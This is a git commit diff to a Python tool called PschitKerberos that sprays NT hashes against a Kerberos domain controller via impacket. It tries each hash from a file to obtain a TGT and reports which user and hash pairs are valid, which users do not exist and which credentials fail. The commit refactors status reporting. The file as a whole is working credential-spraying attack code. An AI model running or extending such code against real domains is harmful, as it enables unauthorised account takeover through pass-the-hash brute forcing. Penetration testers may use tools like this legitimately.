2043249698703d21c4d332f7a49b53096f21ed75
Anh4ckin3 <leandre.star@gmail.com>
2025-01-07 05:37:56 -0500

    fix - typo and update output result

--- pschitkerberos.py
+++ pschitkerberos.py
@@ -13,6 +13,7 @@ from impacket.krb5 import constants
 from termcolor import colored
 from binascii import unhexlify
 
+
 class PschitKerberos:
     def __init__(self, user, domain, hash, password=None, aesKey=None, dc_ip=None, verbose=False):
         self.user = user
@@ -22,41 +23,62 @@ class PschitKerberos:
         self.aesKey = aesKey
         self.dc_ip = dc_ip
         self.verbose = verbose
+        self.status = ''
+
+    def status_format(self, status_type):
+        if status_type == 'info':
+            info = colored("[*]", "blue")
+            return info
+        if status_type == 'success':
+            success = colored("[+]", "green")
+            return success
+        if status_type == 'error':
+            error = colored("[-]", "red")
+            return error
 
     def spray(self):
         lmhash = None
         nthash = self.hash
+
         if self.verbose:
-            print(f"[*] Attempting spray with user: {self.user}, domain: {self.domain}, hash: {self.hash}")
+            print(f"{self.status_format('info')} Attempting spray with user: {self.user}, domain: {self.domain}, hash: {self.hash}")
+
+        # CASE Get TGT    
         try:
             principal_krb = Principal(self.user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
             auth = getKerberosTGT(principal_krb, self.password, self.domain, lmhash, unhexlify(nthash), self.aesKey, self.dc_ip)
+            self.status = 'success'
             if self.verbose:
-                print(f"[+] Successful authentication for {self.user}:{self.hash}")
-            return True
-            
+                print(f"{self.status_format(self.status)} Successful authentication for {self.user}:{self.hash}")
+        
+        # Kerberos errors
         except KerberosError as e:
+            # CASE INVALID LOGIN
             if (e.getErrorCode() == constants.ErrorCodes.KDC_ERR_CLIENT_REVOKED.value) or (e.getErrorCode() == constants.ErrorCodes.KDC_ERR_WRONG_REALM.value) or (e.getErrorCode() == constants.ErrorCodes.KDC_ERR_PREAUTH_FAILED.value):
                 if self.verbose:
-                    print(f"[-] Kerberos error: {e}")
-                return e
+                    print(f"{self.status_format('error')} Kerberos error :", e)
+                self.status = 'error_cred'
+        
+            # CASE INVALID USER 
             elif e.getErrorCode() == constants.ErrorCodes.KDC_ERR_C_PRINCIPAL_UNKNOWN.value:
-                return False
+                if self.verbose:
+                    print(f"{self.status_format('error')} Kerberos error :", e)
+                self.status = 'error_user'
+            
+            # CASE ERROR CLOCK 
             else:
                 if self.verbose:
-                    print(f"[+] Successful authentication for {self.user}:{self.hash}")
-                return True
+                    print(f'{self.status_format(self.status)} Successful authentication for {self.user}:{self.hash}')
+                self.status = 'success'
+        # CASE COULD NOT CONNECT TO DC
         except socket.error as e:
-            print('[-] Could not connect to DC')
-            return
-
+            if self.verbose:
+                print(f"{self.status_format('error')} Could not connect to DC:", e)
+            self.status = 'error_connect'
+        
 
 def main():
     
-    info = colored("[*]", "blue")
-    success = colored("[+]", "green")
-    error = colored("[-]", "red")
-
     banner = pyfiglet.figlet_format("PschitKerberos") 
 
     parser = argparse.ArgumentParser(description="Ca spray fort !")
@@ -69,37 +91,48 @@ def main():
 
     args = parser.parse_args()
 
+    status_form = PschitKerberos(user=args.username, domain=args.domain,hash=None, password=None, aesKey=None, dc_ip=args.dc, verbose=args.verbose)
+
     print(banner)
     # IF file is given on argument
     if args.hashfile:
-        print(f"{info} Testing multiple hashes from file: {args.hashfile} against domain: {args.domain}")
+        print(f"{status_form.status_format('info')} Testing multiple hashes from file: {args.hashfile} against domain: {args.domain}")
         with open(args.hashfile, 'r') as hash:
             for line in hash:
                 hash = line.strip()
                 kerberos_sprayer = PschitKerberos(user=args.username, domain=args.domain, hash=hash, password=None, aesKey=None, dc_ip=args.dc, verbose=args.verbose)
-                match kerberos_sprayer.spray():
-                    case True:
-                        print(f'{success} {args.username}:{hash} is valid credential')
+                kerberos_sprayer.spray()
+                
+                match kerberos_sprayer.status:
+                    case 'success':
+                        print(f'{status_form.status_format('success')} {args.username}:{hash} is valid credential')
                         break
-                    case False:
-                        print(f'{error} {args.username} does not exist in the domain {args.domain}')
+                    case 'error_user':
+                        print(f'{status_form.status_format('error')} {args.username} does not exist in the domain {args.domain}')
                         break
-                    case _:
-                        if args.verbose:
-                            print(f'{error} {args.username}:{args.hash}', kerberos_sprayer.spray())
+                    case 'error_connect':
+                        print(f'{status_form.status_format('error')} could not connect to DC')
+                        break
+                    case 'error_cred':
+                        print(f'{status_form.status_format('error')} {args.username}:{hash} is not a valid credential')
+
     # IF just one is given on argument
     if args.hash:
-        print(f"{info} Testing a single hash against domain: {args.domain}")
+        print(f"{status_form.status_format('info')} Testing a single hash against domain: {args.domain}")
         kerberos_sprayer = PschitKerberos(user=args.username, domain=args.domain, hash=args.hash, password=None, aesKey=None, dc_ip=args.dc, verbose=args.verbose)
-        match kerberos_sprayer.spray():
-            case True:
-                print(f'{success} {args.username}:{args.hash} is valid credential')
-            case False:
-                print(f'{error} {args.username} does not exist in the domain {args.domain}')
-            case _:
-                print(f'{error} {args.username}:{args.hash} is not a valid credential in the domain {args.domain}')
-                if args.verbose:
-                 print(f'{error} {args.username}:{args.hash}', kerberos_sprayer.spray())
+        kerberos_sprayer.spray()
+        match kerberos_sprayer.status:
+            case 'success':
+                print(f'{status_form.status_format('success')} {args.username}:{args.hash} is valid credential')
+                
+            case 'error_user':
+                print(f'{status_form.status_format('error')} {args.username} does not exist in the domain {args.domain}')
+                
+            case 'error_connect':
+                print(f'{status_form.status_format('error')} could not connect to DC')
+                
+            case 'error_cred':
+                print(f'{status_form.status_format('error')} {args.username}:{args.hash} is not a valid credential')
 
     if not args.hash and not args.hashfile:
         parser.error('-hash or -hashfile is required')
